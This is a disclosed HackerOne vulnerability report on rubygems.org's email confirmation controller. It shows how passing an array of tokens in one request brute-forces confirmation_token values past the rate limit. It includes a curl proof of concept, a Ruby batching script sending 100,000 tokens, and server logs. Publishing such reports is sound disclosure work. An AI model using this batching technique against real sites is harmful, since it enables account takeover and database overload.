# rubygems.org Batching attack to `confirmation_token` by bypass rate limit

## Report Details
- **Report ID**: 1559262
- **URL**: https://hackerone.com/reports/1559262
- **State**: Closed
- **Severity**: low
- **Submitted**: 2022-05-05T01:07:11.729Z
- **Disclosed**: 2022-07-13T04:04:52.151Z

## Reporter
- **Username**: ooooooo_q
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
The following is copied from hackerone's report.  https://hackerone.com/reports/1529183

---

I confirmed that EmailConfirmationsController has the same problem as https://hackerone.com/reports/449356 .

https://github.com/rubygems/rubygems.org/blob/962dba88995c98973f52fa84faebce4a62cd56e3/app/controllers/email_confirmations_controller.rb#L55

```ruby
  def validate_confirmation_token
    @user = User.find_by(confirmation_token: params[:token])
    redirect_to root_path, alert: t("failure_when_forbidden") unless @user&.valid_confirmation_token?
  end
```

Using an array in `params[:token]` makes searching for `confirmation_token` more efficient.

### PoC

1. start server in local
2. Access url with multiple token

```
❯ curl --globoff 'http://127.0.0.1:3000/email_confirmations/confirm?token[]=key1&token[]=key2'

<html><body>You are being <a href="http://127.0.0.1:3000/">redirected</a>.</body></html>%
```

#### rails log

```ruby
Started GET "/email_confirmations/confirm?token[]=[FILTERED]&token[]=[FILTERED]" for 127.0.0.1 at 2022-04-03 17:54:41 +0900
Processing by EmailConfirmationsController#update as HTML
  Parameters: {"token"=>"[FILTERED]"}
  User Load (1.8ms)  SELECT "users".* FROM "users" WHERE "users"."confirmation_token" IN ($1, $2) LIMIT $3  [["confirmation_token", "key1"], ["confirmation_token", "key2"], ["LIMIT", 1]]
  ↳ app/controllers/email_confirmations_controller.rb:56:in `validate_confirmation_token'
Redirected to http://127.0.0.1:3000/
Filter chain halted as :validate_confirmation_token rendered or redirected
Completed 302 Found in 71ms (ActiveRecord: 26.5ms | Elasticsearch: 0.0ms | Allocations: 3613)
```

### batching attack

```ruby
require 'net/http'
require 'securerandom'
require 'json'

# https://github.com/thoughtbot/clearance/blob/main/lib/clearance/token.rb
keys = 100_000.times.map{SecureRandom.hex(20).encode('UTF-8')}

uri = URI.parse("http://127.0.0.1:3000/email_confirmations/confirm")
http = Net::HTTP.new(uri.host, uri.port)
req = Net::HTTP::Get.new(uri.path)
req["Content-Type"] = "application/json"
req.body = {token: keys}.to_json

res = http.request(req)
puts res.body
```

In the previous report, 65534 was the limit, but due to a change in the behavior of rails, it is possible to send more numbers.

## Impact

There is a rate limit for accessing websites, but this method allows attacker to confirm a large number of tokens.

https://guides.rubygems.org/rubygems-org-rate-limits/
> API and website: 10 requests per second

If authentication by `validate_confirmation_token` is successful, users who have a valid confirm_token and have not set up multi-factor authentication will be able to sign in.

https://github.com/rubygems/rubygems.org/blob/962dba88995c98973f52fa84faebce4a62cd56e3/app/controllers/email_confirmations_controller.rb#L5

```ruby
  def update
    if @user.mfa_enabled?
      @form_url = mfa_update_email_confirmations_url(token: @user.confirmation_token)
      render template: "multifactor_auths/otp_prompt"
    else
      confirm_email_success
    end
  end
```  

https://github.com/rubygems/rubygems.org/blob/962dba88995c98973f52fa84faebce4a62cd56e3/app/controllers/email_confirmations_controller.rb#L62

```ruby
  def confirm_email_success
    @user.confirm_email!
    sign_in @user
    redirect_to root_path, notice: t("email_confirmations.update.confirmed_email")
  end
```

---

I confirmed the number of tokens that can be sent in one request, it seems to be around 2 million.

The value of `client_max_body_size` of nginx setting in rubygems.org is `500M`, and it seems that attacker can send up to about 12 million tokens when sending using json. https://github.com/rubygems/rubygems.org/blob/master/config/deploy/nginx-configmap.yaml.erb#L79
However, when I confirmed the operation locally, sending more than 2 million tokens made it easier for unexplained postgresql errors to occur.

```
rubygemsorg-db-1         | 2022-04-17 01:58:24.498 UTC [1] LOG:  server process (PID 230) was terminated by signal 9: Killed
rubygemsorg-db-1         | 2022-04-17 01:58:24.498 UTC [1] DETAIL:  Failed process was running: SELECT "users".* FROM "users" WHERE "users"."confirmation_token" IN ('efb0f7101d9fe1daff206d3cfaadf127fcce71fe', '0ae1522d7cc5a65e40d69c25e52b4dcd364930ac', 'c8cd10691f2ed50c42df9f932091d1feefb0b679', '567860e213a4e77aadfd416bc3b773570791542e', 'd47d8646d42d74030384c735799da5b2e999520b', 'd1fafdf37922b299350302dd3c7fd7e6def10308', '1e46e4e5c32a7ea7d95585b87131f06fac27af9d', 'ee80d17ab17509028033d4018a38d3582f0c2410', '2d36a83d29d8ff07b28cec46f0b66c61e5fa4aff', 'd6bfe631f2239640e756bbde772a487ae20cc302', '832108d67aa3b476702a112a1354c660f901560d', 'ba4423b0a1afb1dbbe88e39ffc5a69f6b3e7ae13', '05a58cf07ade4f24727cf43ccbdf4676e941167a', '4fdde1bde7ab049c4d48968dca165b6fff18e776', '91246d1975e252ca97896dd425537b5204cddf58', '0884a42b8745b0255c1675ce788a25e58bccfdbe', 'd6343d92d9b797a8fc8a0b6ea456ada6b219088e', 'fd0050ead3c2463e5351730d488bf2382fb7e70c', '5b358bb1e938bcce5faa60caff18a76917a487f0', '3ac27a5ebeb7f863529afdfc236b9c1356fda7bc', '1a9d407152249861dc4a018d5fafd0ddb34841ae', '1c6e5ca9dacfea97030d87abef46f
rubygemsorg-db-1         | 2022-04-17 01:58:24.499 UTC [1] LOG:  terminating any other active server processes
rubygemsorg-db-1         | 2022-04-17 01:58:24.501 UTC [227] WARNING:  terminating connection because of crash of another server process
```

Calculated, the time required for one IP address brute force is 1915427376 years.

```
16 ** 20 / (2_000_000 * 10) / 3600 / 24 / 365.25
=> 1915427376.6297057
```

Considering that a valid confirm_token exists for each user and that it is sent from multiple IPs using botnet, etc., it is likely to be a few more digits lower.

However, since the confirm_token has an expiration time of 3 hours, it would have been safe enough.
https://github.com/rubygems/rubygems.org/search?q=EMAIL_TOKEN_EXPRIES_AFTER

## Attachments
No attachments
